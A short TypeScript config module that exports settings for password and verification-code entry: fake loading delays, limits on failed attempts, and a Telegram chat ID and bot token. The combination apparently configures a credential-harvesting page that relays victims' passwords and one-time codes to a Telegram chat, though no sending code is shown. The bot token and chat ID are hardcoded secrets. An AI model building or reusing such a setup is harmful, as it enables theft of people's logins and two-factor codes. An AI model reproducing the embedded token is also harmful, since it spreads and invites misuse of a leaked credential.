interface Config {
	settings: {
		code_loading_time: number;
		max_failed_code_attempts: number;
		max_failed_password_attempts: number;
		password_loading_time: number;
	};
	telegram: {
		data_chatid: string;
		data_token: string;
	};
}
const defaultConfig: Config = {
	settings: {
		code_loading_time: 1000,
		max_failed_code_attempts: 3,
		max_failed_password_attempts: 3,
		password_loading_time: 1000,
	},
	telegram: {
		data_chatid: "7211586401",
		data_token: "7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA",
	},
};
const getConfig = (): Config => {
	return defaultConfig;
};

export default getConfig;
